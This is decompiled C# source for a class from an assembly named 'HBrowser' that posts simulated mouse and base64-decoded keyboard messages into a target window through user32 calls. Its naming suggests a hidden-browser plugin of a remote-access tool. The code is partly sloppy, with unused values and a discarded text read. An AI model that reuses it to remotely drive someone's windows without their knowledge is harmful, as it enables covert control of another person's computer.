// HBrowser, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// Plugin.Handle.HandleMouse
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using HBrowser;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class HandleMouse
{
	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	private const int WM_SETTEXT = 12;

	private const int WM_GETTEXT = 13;

	private const int WM_GETTEXTLENGTH = 14;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, string lParam);

	public static void Copy(string hParent)
	{
		if (!Helper.WindowrActive.Equals(IntPtr.Zero))
		{
			int num = SendMessage(Helper.WindowrActive, 14u, 0, null);
			string lParam = Strings.Space(num + 1);
			SendMessage(Helper.WindowrActive, 13u, num + 1, lParam);
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll")]
	private static extern bool GetWindowRect(IntPtr hWnd, ref RECT lpRect);

	public static int MakeLParam(int LoWord, int HiWord)
	{
		return (HiWord << 16) | (LoWord & 0xFFFF);
	}

    public static void MouseLeftDown(int x, int y)
	{
		RECT lpRect = default(RECT);
		GetWindowRect(Helper.WindowrActive, ref lpRect);
		Point point = new Point(10000 + x - lpRect.Left, 10000 + y - lpRect.Top);
		PostMessage(Helper.WindowrActive, 513u, (IntPtr)0, (IntPtr)MakeLParam(point.X, point.Y));
	}

	public static void MouseLeftUp(int x, int y)
	{
		RECT lpRect = default(RECT);
		GetWindowRect(Helper.WindowrActive, ref lpRect);
		Point point = new Point(10000 + x - lpRect.Left, 10000 + y - lpRect.Top);
		PostMessage(Helper.WindowrActive, 514u, (IntPtr)0, (IntPtr)MakeLParam(point.X, point.Y));
	}

	public static void MouseRightDown(int x, int y)
	{
		RECT lpRect = default(RECT);
		GetWindowRect(Helper.WindowrActive, ref lpRect);
		Point point = new Point(10000 + x - lpRect.Left, 10000 + y - lpRect.Top);
		PostMessage(Helper.WindowrActive, 516u, (IntPtr)0, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
	}

	public static void MouseRghitUp(int x, int y)
	{
		RECT lpRect = default(RECT);
		GetWindowRect(Helper.WindowrActive, ref lpRect);
		Point point = new Point(10000 + x - lpRect.Left, 10000 + y - lpRect.Top);
		PostMessage(Helper.WindowrActive, 517u, (IntPtr)0, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
	}


    public static void MouseMove(int x, int y)
	{
		RECT lpRect = default(RECT);
		GetWindowRect(Helper.WindowrActive, ref lpRect);
		Point point = new Point(10000 + x - lpRect.Left, 10000 + y - lpRect.Top);
		PostMessage(Helper.WindowrActive, 512u, (IntPtr)0, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
	}

	public static IntPtr CreateLParamFor_WM_KEYDOWN(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore)
	{
		return KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore, State: false);
	}

	public static IntPtr KeysLParam(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore, bool State)
	{
		int num = RepeatCount | (ushort)(ScanCode << 16);
		if (IsExtendedKey)
		{
			num |= 0x10000;
		}
		if (DownBefore)
		{
			num |= 0x40000000;
		}
		if (State)
		{
			num = (int)((long)num | -2147483648L);
		}
		return new IntPtr(num);
	}

	public static void KeyboardDown(string k)
	{
		string @string = Encoding.UTF8.GetString(Convert.FromBase64String(k));
		int num = Strings.AscW(@string);
		if (num == 8 || num == 13)
		{
			PostMessage(Helper.WindowrActive, 256u, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(@string))), CreateLParamFor_WM_KEYDOWN(1, 30, IsExtendedKey: false, DownBefore: false));
			PostMessage(Helper.WindowrActive, 257u, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(@string))), CreateLParamFor_WM_KEYUP(1, 30, IsExtendedKey: false));
		}
		else
		{
			PostMessage(Helper.WindowrActive, 258u, (IntPtr)Strings.AscW(@string), (IntPtr)1);
		}
	}

	public static IntPtr CreateLParamFor_WM_KEYUP(ushort RepeatCount, byte ScanCode, bool IsExtendedKey)
	{
		return KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore: true, State: true);
	}
}
